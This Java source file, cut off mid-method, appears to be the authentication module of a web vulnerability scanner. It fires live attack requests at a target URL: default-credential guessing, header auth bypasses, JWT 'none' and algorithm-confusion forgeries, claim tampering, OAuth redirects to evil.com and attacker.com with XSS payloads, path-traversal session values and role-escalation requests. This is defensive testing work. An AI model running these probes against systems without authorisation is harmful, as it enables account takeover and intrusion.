package dev.cptcr.vaultscope.service;

import dev.cptcr.vaultscope.model.AuthenticationConfig;
import dev.cptcr.vaultscope.model.Vulnerability;
import com.auth0.jwt.JWT;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.exceptions.JWTVerificationException;
import com.auth0.jwt.interfaces.DecodedJWT;
import com.nimbusds.jose.*;
import com.nimbusds.jose.crypto.RSASSAVerifier;
import com.nimbusds.jose.crypto.MACVerifier;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;
import org.apache.hc.client5.http.classic.methods.*;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.core5.http.io.entity.EntityUtils;
import org.apache.hc.core5.http.io.entity.StringEntity;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.security.interfaces.RSAPublicKey;
import java.time.Instant;
import java.time.temporal.ChronoUnit;
import java.util.*;
import java.util.function.Consumer;
import java.util.regex.Pattern;

public class AuthenticationTester {
    
    private static final String[] WEAK_JWT_SECRETS = {
        "secret", "password", "123456", "qwerty", "admin", "test", "key", "jwt",
        "your-256-bit-secret", "mySecret", "supersecret", "changeme", "default"
    };
    
    private static final String[] COMMON_API_KEYS = {
        "test", "demo", "dev", "staging", "prod", "production", "debug", "admin",
        "12345", "abcdef", "000000", "123456789", "qwerty123", "password123"
    };
    
    private static final String[] SESSION_ATTACK_PAYLOADS = {
        "../../admin", "../../../etc/passwd", "admin", "root", "administrator",
        "user", "guest", "test", "demo", "debug", "dev", "staging", "prod"
    };
    
    private static final String[] PRIVILEGE_ESCALATION_PAYLOADS = {
        "admin", "root", "administrator", "superuser", "sysadmin", "manager",
        "owner", "moderator", "editor", "writer", "reader", "guest"
    };
    
    private AuthenticationConfig config;
    private final SecureRandom random = new SecureRandom();
    
    public AuthenticationTester(AuthenticationConfig config) {
        this.config = config;
    }
    
    public void testAuthenticationVulnerabilities(CloseableHttpClient client, String url, 
                                                List<Vulnerability> vulnerabilities, 
                                                Consumer<String> logCallback) {
        
        if (!config.hasAuthentication()) {
            testUnauthenticatedAccess(client, url, vulnerabilities, logCallback);
            return;
        }
        
        switch (config.getAuthType()) {
            case BASIC -> testBasicAuthVulnerabilities(client, url, vulnerabilities, logCallback);
            case BEARER, JWT -> testJwtVulnerabilities(client, url, vulnerabilities, logCallback);
            case API_KEY -> testApiKeyVulnerabilities(client, url, vulnerabilities, logCallback);
            case OAUTH2 -> testOAuth2Vulnerabilities(client, url, vulnerabilities, logCallback);
            case CUSTOM -> testCustomAuthVulnerabilities(client, url, vulnerabilities, logCallback);
        }
        
        if (config.isTestSessionFixation()) {
            testSessionVulnerabilities(client, url, vulnerabilities, logCallback);
        }
        
        if (config.isTestPrivilegeEscalation()) {
            testPrivilegeEscalationVulnerabilities(client, url, vulnerabilities, logCallback);
        }
    }
    
    private void testUnauthenticatedAccess(CloseableHttpClient client, String url, 
                                         List<Vulnerability> vulnerabilities, 
                                         Consumer<String> logCallback) {
        logCallback.accept("🔍 Testing unauthenticated access to protected resources...");
        
        String[] protectedPaths = {
            "/admin", "/api/admin", "/dashboard", "/panel", "/management", "/config",
            "/users", "/api/users", "/profile", "/api/profile", "/settings", "/api/settings"
        };
        
        for (String path : protectedPaths) {
            try {
                HttpGet request = new HttpGet(url + path);
                
                try (CloseableHttpResponse response = client.execute(request)) {
                    logCallback.accept("🧪 Unauth access: " + path + " → " + response.getCode());
                    
                    if (response.getCode() == 200) {
                        String responseBody = EntityUtils.toString(response.getEntity());
                        if (responseBody.length() > 100 && !responseBody.toLowerCase().contains("login")) {
                            vulnerabilities.add(createVulnerability("CRITICAL", "Unauthenticated Access", 
                                url + path, "Protected resource accessible without authentication",
                                "Endpoint " + path + " returned sensitive data without authentication",
                                "Implement proper authentication checks for all protected endpoints"));
                            logCallback.accept("🚨 CRITICAL: Unauthenticated access to " + path);
                        }
                    }
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
                logCallback.accept("⚠️ Unauth access test error: " + e.getMessage());
            }
        }
    }
    
    private void testBasicAuthVulnerabilities(CloseableHttpClient client, String url, 
                                            List<Vulnerability> vulnerabilities, 
                                            Consumer<String> logCallback) {
        logCallback.accept("🔍 Testing Basic Authentication vulnerabilities...");
        
        testWeakCredentials(client, url, vulnerabilities, logCallback);
        testCredentialBruteForce(client, url, vulnerabilities, logCallback);
        testBasicAuthBypass(client, url, vulnerabilities, logCallback);
    }
    
    private void testWeakCredentials(CloseableHttpClient client, String url, 
                                   List<Vulnerability> vulnerabilities, 
                                   Consumer<String> logCallback) {
        String[] weakPasswords = {
            "password", "123456", "admin", "test", "guest", "user", "root", "default",
            "qwerty", "letmein", "welcome", "secret", "changeme", "password123"
        };
        
        String[] commonUsernames = {
            "admin", "administrator", "root", "user", "guest", "test", "demo", "sa"
        };
        
        for (String username : commonUsernames) {
            for (String password : weakPasswords) {
                try {
                    HttpGet request = new HttpGet(url + "/admin");
                    String credentials = Base64.getEncoder().encodeToString((username + ":" + password).getBytes());
                    request.setHeader("Authorization", "Basic " + credentials);
                    
                    try (CloseableHttpResponse response = client.execute(request)) {
                        logCallback.accept("🧪 Weak creds: " + username + "/" + password + " → " + response.getCode());
                        
                        if (response.getCode() == 200) {
                            vulnerabilities.add(createVulnerability("CRITICAL", "Weak Credentials", url,
                                "Weak default credentials detected",
                                "Successfully authenticated with " + username + "/" + password,
                                "Change default credentials and enforce strong password policies"));
                            logCallback.accept("🚨 CRITICAL: Weak credentials detected!");
                            return;
                        }
                    }
                    
                    Thread.sleep(200);
                } catch (Exception e) {
                    logCallback.accept("⚠️ Weak credentials test error: " + e.getMessage());
                }
            }
        }
    }
    
    private void testCredentialBruteForce(CloseableHttpClient client, String url, 
                                        List<Vulnerability> vulnerabilities, 
                                        Consumer<String> logCallback) {
        logCallback.accept("🔍 Testing brute force protection...");
        
        int attempts = 10;
        int successfulAttempts = 0;
        
        for (int i = 0; i < attempts; i++) {
            try {
                HttpGet request = new HttpGet(url + "/admin");
                String credentials = Base64.getEncoder().encodeToString(("admin:invalid" + i).getBytes());
                request.setHeader("Authorization", "Basic " + credentials);
                
                try (CloseableHttpResponse response = client.execute(request)) {
                    if (response.getCode() != 429 && response.getCode() != 423) {
                        successfulAttempts++;
                    } else {
                        logCallback.accept("✅ Brute force protection detected at attempt " + (i + 1));
                        return;
                    }
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
                break;
            }
        }
        
        if (successfulAttempts >= attempts - 1) {
            vulnerabilities.add(createVulnerability("HIGH", "No Brute Force Protection", url,
                "No protection against brute force attacks",
                "Completed " + successfulAttempts + " failed login attempts without rate limiting",
                "Implement account lockout, rate limiting, and CAPTCHA after failed attempts"));
            logCallback.accept("🚨 HIGH: No brute force protection detected!");
        }
    }
    
    private void testBasicAuthBypass(CloseableHttpClient client, String url, 
                                   List<Vulnerability> vulnerabilities, 
                                   Consumer<String> logCallback) {
        String[][] bypassHeaders = {
            {"Authorization", "Basic"},
            {"Authorization", "Basic "},
            {"Authorization", "Basic YWRtaW46"},
            {"Authorization", "Basic YWRtaW46YWRtaW4="},
            {"X-Authorization", "Basic YWRtaW46YWRtaW4="},
            {"X-Remote-User", "admin"},
            {"X-Forwarded-User", "admin"}
        };
        
        for (String[] header : bypassHeaders) {
            try {
                HttpGet request = new HttpGet(url + "/admin");
                request.setHeader(header[0], header[1]);
                
                try (CloseableHttpResponse response = client.execute(request)) {
                    logCallback.accept("🧪 Auth bypass: " + header[0] + " → " + response.getCode());
                    
                    if (response.getCode() == 200) {
                        vulnerabilities.add(createVulnerability("CRITICAL", "Authentication Bypass", url,
                            "Basic authentication bypass detected",
                            "Bypassed authentication using header: " + header[0] + ": " + header[1],
                            "Implement proper authentication validation and do not trust client headers"));
                        logCallback.accept("🚨 CRITICAL: Basic auth bypass detected!");
                        return;
                    }
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
                logCallback.accept("⚠️ Basic auth bypass test error: " + e.getMessage());
            }
        }
    }
    
    private void testJwtVulnerabilities(CloseableHttpClient client, String url, 
                                      List<Vulnerability> vulnerabilities, 
                                      Consumer<String> logCallback) {
        logCallback.accept("🔍 Testing JWT vulnerabilities...");
        
        if (config.isTestWeakSecrets()) {
            testWeakJwtSecrets(client, url, vulnerabilities, logCallback);
        }
        
        if (config.isTestAlgorithmConfusion()) {
            testAlgorithmConfusion(client, url, vulnerabilities, logCallback);
        }
        
        if (config.isTestTokenExpiration()) {
            testTokenExpiration(client, url, vulnerabilities, logCallback);
        }
        
        testJwtManipulation(client, url, vulnerabilities, logCallback);
        testJwtNoneAlgorithm(client, url, vulnerabilities, logCallback);
    }
    
    private void testWeakJwtSecrets(CloseableHttpClient client, String url, 
                                  List<Vulnerability> vulnerabilities, 
                                  Consumer<String> logCallback) {
        if (config.getToken() == null) return;
        
        try {
            DecodedJWT jwt = JWT.decode(config.getToken());
            
            for (String secret : WEAK_JWT_SECRETS) {
                try {
                    Algorithm algorithm = Algorithm.HMAC256(secret);
                    JWT.require(algorithm).build().verify(config.getToken());
                    
                    vulnerabilities.add(createVulnerability("CRITICAL", "Weak JWT Secret", url,
                        "JWT signed with weak secret",
                        "JWT can be forged using weak secret: " + secret,
                        "Use strong, random secrets (minimum 256 bits) and rotate regularly"));
                    logCallback.accept("🚨 CRITICAL: Weak JWT secret detected: " + secret);
                    return;
                } catch (JWTVerificationException ignored) {
                }
            }
            
            if (config.getJwtSecret() != null && config.getJwtSecret().length() < 32) {
                vulnerabilities.add(createVulnerability("HIGH", "Short JWT Secret", url,
                    "JWT secret appears to be too short",
                    "JWT secret length may be insufficient for security",
                    "Use secrets with minimum 256 bits (32 characters) length"));
                logCallback.accept("⚠️ HIGH: JWT secret may be too short");
            }
            
        } catch (Exception e) {
            logCallback.accept("⚠️ JWT secret test error: " + e.getMessage());
        }
    }
    
    private void testAlgorithmConfusion(CloseableHttpClient client, String url, 
                                      List<Vulnerability> vulnerabilities, 
                                      Consumer<String> logCallback) {
        if (config.getToken() == null) return;
        
        try {
            DecodedJWT jwt = JWT.decode(config.getToken());
            
            String noneToken = createNoneAlgorithmToken(jwt);
            HttpGet request = new HttpGet(url + "/admin");
            request.setHeader("Authorization", "Bearer " + noneToken);
            
            try (CloseableHttpResponse response = client.execute(request)) {
                logCallback.accept("🧪 Algorithm confusion (none) → " + response.getCode());
                
                if (response.getCode() == 200) {
                    vulnerabilities.add(createVulnerability("CRITICAL", "Algorithm Confusion", url,
                        "JWT accepts 'none' algorithm",
                        "JWT can be bypassed by setting algorithm to 'none'",
                        "Reject tokens with 'none' algorithm and validate algorithm explicitly"));
                    logCallback.accept("🚨 CRITICAL: Algorithm confusion (none) detected!");
                }
            }
            
            String rsaToHmacToken = createRsaToHmacToken(jwt);
            if (rsaToHmacToken != null) {
                request = new HttpGet(url + "/admin");
                request.setHeader("Authorization", "Bearer " + rsaToHmacToken);
                
                try (CloseableHttpResponse response = client.execute(request)) {
                    logCallback.accept("🧪 Algorithm confusion (RSA→HMAC) → " + response.getCode());
                    
                    if (response.getCode() == 200) {
                        vulnerabilities.add(createVulnerability("CRITICAL", "Algorithm Confusion", url,
                            "JWT vulnerable to RSA to HMAC confusion",
                            "JWT can be forged by changing algorithm from RSA to HMAC",
                            "Explicitly validate the expected algorithm and reject algorithm changes"));
                        logCallback.accept("🚨 CRITICAL: Algorithm confusion (RSA→HMAC) detected!");
                    }
                }
            }
            
        } catch (Exception e) {
            logCallback.accept("⚠️ Algorithm confusion test error: " + e.getMessage());
        }
    }
    
    private void testTokenExpiration(CloseableHttpClient client, String url, 
                                   List<Vulnerability> vulnerabilities, 
                                   Consumer<String> logCallback) {
        if (config.getToken() == null) return;
        
        try {
            DecodedJWT jwt = JWT.decode(config.getToken());
            
            String expiredToken = createExpiredToken(jwt);
            HttpGet request = new HttpGet(url + "/admin");
            request.setHeader("Authorization", "Bearer " + expiredToken);
            
            try (CloseableHttpResponse response = client.execute(request)) {
                logCallback.accept("🧪 Expired token test → " + response.getCode());
                
                if (response.getCode() == 200) {
                    vulnerabilities.add(createVulnerability("HIGH", "Expired Token Accepted", url,
                        "Application accepts expired JWT tokens",
                        "Expired JWT token was accepted for authentication",
                        "Implement proper token expiration validation and reject expired tokens"));
                    logCallback.accept("🚨 HIGH: Expired token accepted!");
                }
            }
            
            String futureToken = createFutureToken(jwt);
            request = new HttpGet(url + "/admin");
            request.setHeader("Authorization", "Bearer " + futureToken);
            
            try (CloseableHttpResponse response = client.execute(request)) {
                logCallback.accept("🧪 Future token test → " + response.getCode());
                
                if (response.getCode() == 200) {
                    vulnerabilities.add(createVulnerability("MEDIUM", "Future Token Accepted", url,
                        "Application accepts tokens with future 'not before' time",
                        "JWT token with future 'nbf' claim was accepted",
                        "Validate 'nbf' (not before) claim and reject premature tokens"));
                    logCallback.accept("⚠️ MEDIUM: Future token accepted!");
                }
            }
            
        } catch (Exception e) {
            logCallback.accept("⚠️ Token expiration test error: " + e.getMessage());
        }
    }
    
    private void testJwtManipulation(CloseableHttpClient client, String url, 
                                   List<Vulnerability> vulnerabilities, 
                                   Consumer<String> logCallback) {
        if (config.getToken() == null) return;
        
        try {
            DecodedJWT jwt = JWT.decode(config.getToken());
            
            String[] manipulatedTokens = {
                manipulateJwtClaim(jwt, "user", "admin"),
                manipulateJwtClaim(jwt, "role", "admin"),
                manipulateJwtClaim(jwt, "admin", "true"),
                manipulateJwtClaim(jwt, "isAdmin", "true"),
                manipulateJwtClaim(jwt, "permissions", "admin,user,guest")
            };
            
            for (String token : manipulatedTokens) {
                if (token != null) {
                    HttpGet request = new HttpGet(url + "/admin");
                    request.setHeader("Authorization", "Bearer " + token);
                    
                    try (CloseableHttpResponse response = client.execute(request)) {
                        logCallback.accept("🧪 JWT manipulation test → " + response.getCode());
                        
                        if (response.getCode() == 200) {
                            vulnerabilities.add(createVulnerability("CRITICAL", "JWT Manipulation", url,
                                "JWT claims can be manipulated",
                                "Modified JWT token was accepted with manipulated claims",
                                "Implement proper JWT signature validation and verify all claims"));
                            logCallback.accept("🚨 CRITICAL: JWT manipulation detected!");
                            return;
                        }
                    }
                }
            }
            
        } catch (Exception e) {
            logCallback.accept("⚠️ JWT manipulation test error: " + e.getMessage());
        }
    }
    
    private void testJwtNoneAlgorithm(CloseableHttpClient client, String url, 
                                    List<Vulnerability> vulnerabilities, 
                                    Consumer<String> logCallback) {
        if (config.getToken() == null) return;
        
        try {
            DecodedJWT jwt = JWT.decode(config.getToken());
            
            String header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
            String payload = new String(Base64.getUrlDecoder().decode(jwt.getPayload()));
            
            String noneToken = Base64.getUrlEncoder().withoutPadding().encodeToString(header.getBytes()) + "." +
                              Base64.getUrlEncoder().withoutPadding().encodeToString(payload.getBytes()) + ".";
            
            HttpGet request = new HttpGet(url + "/admin");
            request.setHeader("Authorization", "Bearer " + noneToken);
            
            try (CloseableHttpResponse response = client.execute(request)) {
                logCallback.accept("🧪 JWT none algorithm → " + response.getCode());
                
                if (response.getCode() == 200) {
                    vulnerabilities.add(createVulnerability("CRITICAL", "JWT None Algorithm", url,
                        "JWT accepts 'none' algorithm",
                        "JWT with 'none' algorithm was accepted without signature verification",
                        "Explicitly reject tokens with 'none' algorithm in production"));
                    logCallback.accept("🚨 CRITICAL: JWT none algorithm accepted!");
                }
            }
            
        } catch (Exception e) {
            logCallback.accept("⚠️ JWT none algorithm test error: " + e.getMessage());
        }
    }
    
    private void testApiKeyVulnerabilities(CloseableHttpClient client, String url, 
                                         List<Vulnerability> vulnerabilities, 
                                         Consumer<String> logCallback) {
        logCallback.accept("🔍 Testing API Key vulnerabilities...");
        
        testWeakApiKeys(client, url, vulnerabilities, logCallback);
        testApiKeyExposure(client, url, vulnerabilities, logCallback);
        testApiKeyBruteForce(client, url, vulnerabilities, logCallback);
    }
    
    private void testWeakApiKeys(CloseableHttpClient client, String url, 
                               List<Vulnerability> vulnerabilities, 
                               Consumer<String> logCallback) {
        
        for (String apiKey : COMMON_API_KEYS) {
            try {
                HttpGet request = new HttpGet(url + "/api/data");
                request.setHeader(config.getApiKeyHeader(), apiKey);
                
                try (CloseableHttpResponse response = client.execute(request)) {
                    logCallback.accept("🧪 Weak API key: " + apiKey + " → " + response.getCode());
                    
                    if (response.getCode() == 200) {
                        vulnerabilities.add(createVulnerability("CRITICAL", "Weak API Key", url,
                            "Weak or default API key detected",
                            "API accepts weak key: " + apiKey,
                            "Generate strong, unique API keys and rotate regularly"));
                        logCallback.accept("🚨 CRITICAL: Weak API key detected!");
                        return;
                    }
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
                logCallback.accept("⚠️ Weak API key test error: " + e.getMessage());
            }
        }
    }
    
    private void testApiKeyExposure(CloseableHttpClient client, String url, 
                                  List<Vulnerability> vulnerabilities, 
                                  Consumer<String> logCallback) {
        
        String[] exposurePaths = {
            "/.env", "/config.json", "/app.config", "/settings.json", "/api-keys.txt",
            "/swagger.json", "/openapi.json", "/docs", "/debug", "/status"
        };
        
        for (String path : exposurePaths) {
            try {
                HttpGet request = new HttpGet(url + path);
                
                try (CloseableHttpResponse response = client.execute(request)) {
                    if (response.getCode() == 200) {
                        String responseBody = EntityUtils.toString(response.getEntity());
                        
                        if (containsApiKey(responseBody)) {
                            vulnerabilities.add(createVulnerability("CRITICAL", "API Key Exposure", url + path,
                                "API keys exposed in public endpoint",
                                "Endpoint " + path + " contains API key information",
                                "Remove API keys from public endpoints and secure configuration files"));
                            logCallback.accept("🚨 CRITICAL: API key exposure in " + path);
                        }
                    }
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
                logCallback.accept("⚠️ API key exposure test error: " + e.getMessage());
            }
        }
    }
    
    private void testApiKeyBruteForce(CloseableHttpClient client, String url, 
                                    List<Vulnerability> vulnerabilities, 
                                    Consumer<String> logCallback) {
        
        int attempts = 15;
        int successfulAttempts = 0;
        
        for (int i = 0; i < attempts; i++) {
            try {
                HttpGet request = new HttpGet(url + "/api/data");
                request.setHeader(config.getApiKeyHeader(), "invalid-key-" + i);
                
                try (CloseableHttpResponse response = client.execute(request)) {
                    if (response.getCode() != 429 && response.getCode() != 423) {
                        successfulAttempts++;
                    } else {
                        logCallback.accept("✅ API key brute force protection detected");
                        return;
                    }
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
                break;
            }
        }
        
        if (successfulAttempts >= attempts - 2) {
            vulnerabilities.add(createVulnerability("HIGH", "API Key Brute Force", url,
                "No protection against API key brute force",
                "Multiple invalid API key attempts succeeded without throttling",
                "Implement rate limiting and monitoring for invalid API key attempts"));
            logCallback.accept("🚨 HIGH: No API key brute force protection!");
        }
    }
    
    private void testOAuth2Vulnerabilities(CloseableHttpClient client, String url, 
                                         List<Vulnerability> vulnerabilities, 
                                         Consumer<String> logCallback) {
        logCallback.accept("🔍 Testing OAuth 2.0 vulnerabilities...");
        
        testOAuth2StateParameter(client, url, vulnerabilities, logCallback);
        testOAuth2RedirectUri(client, url, vulnerabilities, logCallback);
        testOAuth2ImplicitFlow(client, url, vulnerabilities, logCallback);
    }
    
    private void testOAuth2StateParameter(CloseableHttpClient client, String url, 
                                        List<Vulnerability> vulnerabilities, 
                                        Consumer<String> logCallback) {
        
        if (config.getAuthorizationUrl() == null) return;
        
        try {
            String authUrl = config.getAuthorizationUrl() + 
                           "?response_type=code&client_id=" + config.getClientId() + 
                           "&redirect_uri=" + URLEncoder.encode(url + "/callback", StandardCharsets.UTF_8);
            
            HttpGet request = new HttpGet(authUrl);
            
            try (CloseableHttpResponse response = client.execute(request)) {
                logCallback.accept("🧪 OAuth2 state parameter test → " + response.getCode());
                
                if (response.getCode() == 200 || response.getCode() == 302) {
                    vulnerabilities.add(createVulnerability("HIGH", "Missing OAuth2 State Parameter", url,
                        "OAuth2 flow missing state parameter",
                        "Authorization request succeeded without state parameter",
                        "Always include and validate state parameter in OAuth2 flows"));
                    logCallback.accept("🚨 HIGH: Missing OAuth2 state parameter!");
                }
            }
            
        } catch (Exception e) {
            logCallback.accept("⚠️ OAuth2 state test error: " + e.getMessage());
        }
    }
    
    private void testOAuth2RedirectUri(CloseableHttpClient client, String url, 
                                     List<Vulnerability> vulnerabilities, 
                                     Consumer<String> logCallback) {
        
        if (config.getAuthorizationUrl() == null) return;
        
        String[] maliciousRedirects = {
            "http://evil.com/callback",
            "https://attacker.com/steal",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>"
        };
        
        for (String redirect : maliciousRedirects) {
            try {
                String authUrl = config.getAuthorizationUrl() + 
                               "?response_type=code&client_id=" + config.getClientId() + 
                               "&redirect_uri=" + URLEncoder.encode(redirect, StandardCharsets.UTF_8);
                
                HttpGet request = new HttpGet(authUrl);
                
                try (CloseableHttpResponse response = client.execute(request)) {
                    logCallback.accept("🧪 OAuth2 redirect test → " + response.getCode());
                    
                    if (response.getCode() == 200 || response.getCode() == 302) {
                        vulnerabilities.add(createVulnerability("CRITICAL", "OAuth2 Open Redirect", url,
                            "OAuth2 allows arbitrary redirect URIs",
                            "Malicious redirect URI accepted: " + redirect,
                            "Implement strict redirect URI validation and whitelist allowed URIs"));
                        logCallback.accept("🚨 CRITICAL: OAuth2 open redirect detected!");
                        return;
                    }
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
                logCallback.accept("⚠️ OAuth2 redirect test error: " + e.getMessage());
            }
        }
    }
    
    private void testOAuth2ImplicitFlow(CloseableHttpClient client, String url, 
                                      List<Vulnerability> vulnerabilities, 
                                      Consumer<String> logCallback) {
        
        if (config.getAuthorizationUrl() == null) return;
        
        try {
            String authUrl = config.getAuthorizationUrl() + 
                           "?response_type=token&client_id=" + config.getClientId() + 
                           "&redirect_uri=" + URLEncoder.encode(url + "/callback", StandardCharsets.UTF_8);
            
            HttpGet request = new HttpGet(authUrl);
            
            try (CloseableHttpResponse response = client.execute(request)) {
                logCallback.accept("🧪 OAuth2 implicit flow test → " + response.getCode());
                
                if (response.getCode() == 200 || response.getCode() == 302) {
                    vulnerabilities.add(createVulnerability("MEDIUM", "OAuth2 Implicit Flow", url,
                        "OAuth2 implicit flow enabled",
                        "Implicit flow allows tokens in URL fragments",
                        "Disable implicit flow and use authorization code flow with PKCE"));
                    logCallback.accept("⚠️ MEDIUM: OAuth2 implicit flow enabled!");
                }
            }
            
        } catch (Exception e) {
            logCallback.accept("⚠️ OAuth2 implicit flow test error: " + e.getMessage());
        }
    }
    
    private void testCustomAuthVulnerabilities(CloseableHttpClient client, String url, 
                                             List<Vulnerability> vulnerabilities, 
                                             Consumer<String> logCallback) {
        logCallback.accept("🔍 Testing custom authentication vulnerabilities...");
        
        for (Map.Entry<String, String> header : config.getCustomHeaders().entrySet()) {
            testCustomHeaderBypass(client, url, vulnerabilities, logCallback, header.getKey(), header.getValue());
        }
    }
    
    private void testCustomHeaderBypass(CloseableHttpClient client, String url, 
                                      List<Vulnerability> vulnerabilities, 
                                      Consumer<String> logCallback, String headerName, String headerValue) {
        
        String[] bypassValues = {
            "", "null", "undefined", "admin", "true", "1", "0", "false",
            headerValue + "modified", "bypass", "test", "guest"
        };
        
        for (String value : bypassValues) {
            try {
                HttpGet request = new HttpGet(url + "/admin");
                request.setHeader(headerName, value);
                
                try (CloseableHttpResponse response = client.execute(request)) {
                    logCallback.accept("🧪 Custom header bypass: " + headerName + "=" + value + " → " + response.getCode());
                    
                    if (response.getCode() == 200) {
                        vulnerabilities.add(createVulnerability("HIGH", "Custom Auth Bypass", url,
                            "Custom authentication can be bypassed",
                            "Bypassed auth using " + headerName + ": " + value,
                            "Implement proper validation for custom authentication headers"));
                        logCallback.accept("🚨 HIGH: Custom auth bypass detected!");
                        return;
                    }
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
                logCallback.accept("⚠️ Custom auth bypass test error: " + e.getMessage());
            }
        }
    }
    
    private void testSessionVulnerabilities(CloseableHttpClient client, String url, 
                                          List<Vulnerability> vulnerabilities, 
                                          Consumer<String> logCallback) {
        logCallback.accept("🔍 Testing session management vulnerabilities...");
        
        testSessionFixation(client, url, vulnerabilities, logCallback);
        testSessionHijacking(client, url, vulnerabilities, logCallback);
        testSessionExpiration(client, url, vulnerabilities, logCallback);
    }
    
    private void testSessionFixation(CloseableHttpClient client, String url, 
                                   List<Vulnerability> vulnerabilities, 
                                   Consumer<String> logCallback) {
        
        for (String sessionId : SESSION_ATTACK_PAYLOADS) {
            try {
                HttpGet request = new HttpGet(url + "/login");
                request.setHeader("Cookie", "JSESSIONID=" + sessionId + "; sessionid=" + sessionId);
                
                try (CloseableHttpResponse response = client.execute(request)) {
                    logCallback.accept("🧪 Session fixation: " + sessionId + " → " + response.getCode());
                    
                    if (response.getCode() == 200) {
                        String responseBody = EntityUtils.toString(response.getEntity());
                        if (responseBody.contains(sessionId)) {
                            vulnerabilities.add(createVulnerability("HIGH", "Session Fixation", url,
                                "Session fixation vulnerability detected",
                                "Application accepts predefined session ID: " + sessionId,
                                "Regenerate session IDs after successful authentication"));
                            logCallback.accept("🚨 HIGH: Session fixation detected!");
                            return;
                        }
                    }
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
                logCallback.accept("⚠️ Session fixation test error: " + e.getMessage());
            }
        }
    }
    
    private void testSessionHijacking(CloseableHttpClient client, String url, 
                                    List<Vulnerability> vulnerabilities, 
                                    Consumer<String> logCallback) {
        
        try {
            HttpGet request = new HttpGet(url + "/profile");
            if (config.getAuthorizationHeader() != null) {
                request.setHeader("Authorization", config.getAuthorizationHeader());
            }
            
            try (CloseableHttpResponse response = client.execute(request)) {
                String setCookieHeader = response.getFirstHeader("Set-Cookie") != null ?
                    response.getFirstHeader("Set-Cookie").getValue() : "";
                
                logCallback.accept("🧪 Session cookie security test → " + response.getCode());
                
                if (!setCookieHeader.isEmpty()) {
                    if (!setCookieHeader.contains("Secure")) {
                        vulnerabilities.add(createVulnerability("MEDIUM", "Insecure Session Cookie", url,
                            "Session cookie missing Secure flag",
                            "Session cookie can be transmitted over HTTP",
                            "Add Secure flag to session cookies"));
                        logCallback.accept("⚠️ MEDIUM: Session cookie missing Secure flag!");
                    }
                    
                    if (!setCookieHeader.contains("HttpOnly")) {
                        vulnerabilities.add(createVulnerability("MEDIUM", "Session Cookie XSS", url,
                            "Session cookie missing HttpOnly flag",
                            "Session cookie accessible via JavaScript",
                            "Add HttpOnly flag to session cookies"));
                        logCallback.accept("⚠️ MEDIUM: Session cookie missing HttpOnly flag!");
                    }
                    
                    if (!setCookieHeader.contains("SameSite")) {
                        vulnerabilities.add(createVulnerability("MEDIUM", "Session Cookie CSRF", url,
                            "Session cookie missing SameSite attribute",
                            "Session cookie vulnerable to CSRF attacks",
                            "Add SameSite attribute to session cookies"));
                        logCallback.accept("⚠️ MEDIUM: Session cookie missing SameSite!");
                    }
                }
            }
            
        } catch (Exception e) {
            logCallback.accept("⚠️ Session hijacking test error: " + e.getMessage());
        }
    }
    
    private void testSessionExpiration(CloseableHttpClient client, String url, 
                                     List<Vulnerability> vulnerabilities, 
                                     Consumer<String> logCallback) {
        
        try {
            HttpGet request = new HttpGet(url + "/profile");
            if (config.getAuthorizationHeader() != null) {
                request.setHeader("Authorization", config.getAuthorizationHeader());
            }
            
            try (CloseableHttpResponse response = client.execute(request)) {
                String setCookieHeader = response.getFirstHeader("Set-Cookie") != null ?
                    response.getFirstHeader("Set-Cookie").getValue() : "";
                
                logCallback.accept("🧪 Session expiration test → " + response.getCode());
                
                if (!setCookieHeader.isEmpty() && !setCookieHeader.contains("Max-Age") && 
                    !setCookieHeader.contains("Expires")) {
                    vulnerabilities.add(createVulnerability("LOW", "Session No Expiration", url,
                        "Session cookie has no expiration",
                        "Session cookie may persist indefinitely",
                        "Set appropriate Max-Age or Expires for session cookies"));
                    logCallback.accept("⚠️ LOW: Session cookie has no expiration!");
                }
            }
            
        } catch (Exception e) {
            logCallback.accept("⚠️ Session expiration test error: " + e.getMessage());
        }
    }
    
    private void testPrivilegeEscalationVulnerabilities(CloseableHttpClient client, String url, 
                                                       List<Vulnerability> vulnerabilities, 
                                                       Consumer<String> logCallback) {
        logCallback.accept("🔍 Testing privilege escalation vulnerabilities...");
        
        testRoleManipulation(client, url, vulnerabilities, logCallback);
        testParameterPollution(client, url, vulnerabilities, logCallback);
        testHttpVerbTampering(client, url, vulnerabilities, logCallback);
    }
    
    private void testRoleManipulation(CloseableHttpClient client, String url, 
                                    List<Vulnerability> vulnerabilities, 
                                    Consumer<String> logCallback) {
        
        for (String role : PRIVILEGE_ESCALATION_PAYLOADS) {
            try {
                HttpPost request = new HttpPost(url + "/api/profile");
                request.setHeader("Content-Type", "application/json");
                if (config.getAuthorizationHeader() != null) {
                    request.setHeader("Authorization", config.getAuthorizationHeader());
                }
                
                String payload = "{\"role\":\"" + role + "\",\"permissions\":[\"" + role + "\"],\"isAdmin\":true}";
                request.setEntity(new StringEntity(payload));
                
                try (CloseableHttpResponse response = client.execute(request)) {
                    logCallback.accept("🧪 Role manipulation: " + role + " → " + response.getCode());
                    
                    if (response.getCode() == 200) {
                        String responseBody = EntityUtils.toString(response.getEntity());
                        if (responseBody.contains("\"role\":\"" + role + "\"") || 
                            responseBody.contains("\"isAdmin\":true")) {
                            vulnerabilities.add(createVulnerability("CRITICAL", "Privilege Escalation", url,
                                "Role manipulation allows privilege escalation",
                                "Successfully modified role to: " + role,
                                "Implement proper authorization checks and validate role changes"));
                            logCallback.accept("🚨 CRITICAL: Privilege escalation detected!");
                            return;
                        }
                    }
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
